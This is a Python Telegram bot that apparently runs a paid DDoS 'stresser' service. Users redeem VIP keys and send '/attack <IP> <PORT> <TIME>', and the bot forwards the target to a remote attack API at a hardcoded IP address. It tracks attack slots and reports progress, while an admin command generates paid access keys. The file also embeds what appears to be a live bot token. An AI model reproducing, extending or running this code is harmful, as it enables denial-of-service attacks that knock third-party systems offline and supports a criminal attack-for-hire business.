import telebot
import requests
import time
import random
import string
import json
import os
import threading

# --- CONFIGURATION ---
TOKEN = "8605810780:AAHpOMnTfgzviFfbHIk2du8S7tAJKseaNzY"
ADMIN_ID = 8787952549
API_BASE = "http://13.203.155.253/attack"
API_KEY_DDoS = "DESTRUCTED"

bot = telebot.TeleBot(TOKEN, parse_mode="Markdown")

active_attacks = []
MAX_CONCURRENT = 2

# --- ROBUST DATABASE SYSTEM ---
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
USERS_FILE = os.path.join(BASE_DIR, "users.json")
KEYS_FILE = os.path.join(BASE_DIR, "keys.json")

def load_db(file_path):
    if os.path.exists(file_path):
        try:
            with open(file_path, "r") as f:
                content = f.read().strip()
                return json.loads(content) if content else {}
        except Exception:
            return {}
    return {}

def save_db(file_path, data):
    try:
        with open(file_path, "w") as f:
            json.dump(data, f, indent=4)
    except Exception as e:
        print(f"Error saving DB: {e}")

# Initial Load
users = load_db(USERS_FILE)
keys = load_db(KEYS_FILE)

# --- UTILS ---
def get_progress_bar(remaining, total):
    filled = int(((total - remaining) / total) * 10)
    bar = "▓" * filled + "░" * (10 - filled)
    return f"[{bar}] {int(((total - remaining) / total) * 100)}%"

def send_attack_request(target, port, duration):
    try:
        response = requests.get(
            API_BASE, 
            params={"ip": target, "port": port, "time": duration, "key": API_KEY_DDoS},
            timeout=15
        )
        return response.status_code == 200
    except:
        return False

def update_progress(chat_id, msg_id, target, port, duration):
    start_time = time.time()
    success = send_attack_request(target, port, duration)
    
    if not success:
        bot.edit_message_text("❌ **API SERVER ERROR**\nAttack failed to trigger.", chat_id, msg_id)
        global active_attacks
        active_attacks = [a for a in active_attacks if a['target'] != target]
        return

    while time.time() - start_time < duration:
        rem = int(duration - (time.time() - start_time))
        progress = get_progress_bar(rem, duration)
        try:
            bot.edit_message_text(
                f"🚀 **ATTACK IN PROGRESS** 🚀\n━━━━━━━━━━━━━━━━━━━━━━\n"
                f"🎯 **TARGET:** `{target}:{port}`\n"
                f"⏳ **TIME:** `{rem}s`\n"
                f"📊 **PROGRESS:** `{progress}`\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"💥 **POWERED BY SASTA DEVELOPER**",
                chat_id, msg_id
            )
        except:
            break
        time.sleep(5)
    
    try:
        bot.edit_message_text(f"✅ **ATTACK COMPLETE**\nTarget `{target}` finished.", chat_id, msg_id)
    except:
        pass
    active_attacks[:] = [a for a in active_attacks if a['target'] != target]

# --- HANDLERS ---

@bot.message_handler(commands=['start'])
def start(message):
    uid = str(message.from_user.id)
    uname = f"@{message.from_user.username}" if message.from_user.username else "NoUsername"
    
    current_users = load_db(USERS_FILE)
    if uid not in current_users:
        current_users[uid] = {"expiry": 0, "username": uname}
        save_db(USERS_FILE, current_users)

    slots = f"{len(active_attacks)}/{MAX_CONCURRENT}"
    role = "👑 ADMIN" if int(uid) == ADMIN_ID else "⭐ VIP" if current_users.get(uid, {}).get('expiry', 0) > time.time() else "🆓 FREE"
    
    dashboard = (
        "🚀 **SASTA DEVELOPER TERMINAL** 🚀\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"👤 **USER:** `{message.from_user.first_name}`\n"
        f"💳 **PLAN:** `{role}`\n"
        f"🛰️ **SLOTS:** `{slots}`\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "🛠️ **TERMINAL COMMANDS:**\n"
        "👉 `/attack` - Stress Target\n"
        "👉 `/running` - Live Attacks\n"
        "👉 `/redeem` - Activate Key\n"
        "👉 `/myid` - Your Info\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "👑 **OWNER:** @sastadeveloper"
    )
    bot.send_message(message.chat.id, dashboard)

@bot.message_handler(commands=['attack'])
def attack_cmd(message):
    uid = str(message.from_user.id)
    current_users = load_db(USERS_FILE)
    
    if current_users.get(uid, {}).get('expiry', 0) < time.time() and int(uid) != ADMIN_ID:
        bot.reply_to(message, "🚫 **VIP REQUIRED**\nRedeem a key first."); return
    if len(active_attacks) >= MAX_CONCURRENT:
        bot.reply_to(message, "⚠️ **SLOTS FULL**"); return

    try:
        args = message.text.split()
        if len(args) < 4:
            bot.send_message(message.chat.id, "📝 **Usage:** `/attack <IP> <PORT> <TIME>`")
            return
        target, port, duration = args[1], args[2], int(args[3])
        if duration > 300: duration = 300
        
        active_attacks.append({"target": target, "end_time": time.time() + duration})
        msg = bot.send_message(message.chat.id, "🛰️ **Initializing Terminal...**")
        threading.Thread(target=update_progress, args=(message.chat.id, msg.message_id, target, port, duration)).start()
    except:
        bot.send_message(message.chat.id, "⚠️ **Invalid Attack Format.**")

@bot.message_handler(commands=['redeem'])
def redeem(message):
    uid = str(message.from_user.id)
    try:
        parts = message.text.split()
        if len(parts) < 2:
            bot.reply_to(message, "📝 **Usage:** `/redeem <KEY>`")
            return
        
        input_key = parts[1].strip()
        current_keys = load_db(KEYS_FILE)
        current_users = load_db(USERS_FILE)
        
        if input_key in current_keys:
            if current_keys[input_key]['used_by'] is None:
                if uid not in current_users:
                    current_users[uid] = {"expiry": 0, "username": f"@{message.from_user.username}" if message.from_user.username else str(uid)}
                
                now = time.time()
                old_expiry = current_users[uid].get('expiry', 0)
                current_users[uid]['expiry'] = max(old_expiry, now) + current_keys[input_key]['duration']
                
                current_keys[input_key]['used_by'] = f"@{message.from_user.username}" if message.from_user.username else str(uid)
                
                save_db(USERS_FILE, current_users)
                save_db(KEYS_FILE, current_keys)
                bot.reply_to(message, "👑 **VIP ACCESS GRANTED!**")
            else:
                bot.reply_to(message, f"❌ **Key already used by {current_keys[input_key]['used_by']}**")
        else:
            bot.reply_to(message, "❌ **Invalid Key.**")
    except Exception:
        bot.reply_to(message, "⚠️ **Redeem System Error.**")

# --- ADMIN COMMANDS ---
@bot.message_handler(commands=['genkey'])
def genkey(message):
    if message.from_user.id != ADMIN_ID: return
    try:
        args = message.text.split()
        days, count = int(args[1]), int(args[2])
        current_keys = load_db(KEYS_FILE)
        new_keys_list = []
        for _ in range(count):
            k = "SD-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
            current_keys[k] = {"duration": days * 86400, "used_by": None}
            new_keys_list.append(k)
        save_db(KEYS_FILE, current_keys)
        bot.send_message(message.chat.id, f"🎫 **KEYS GENERATED:**\n`" + "\n".join(new_keys_list) + "`")
    except:
        bot.reply_to(message, "Usage: `/genkey <days> <count>`")

print("v10.8 FINAL FIXED ONLINE...")
bot.infinity_polling()
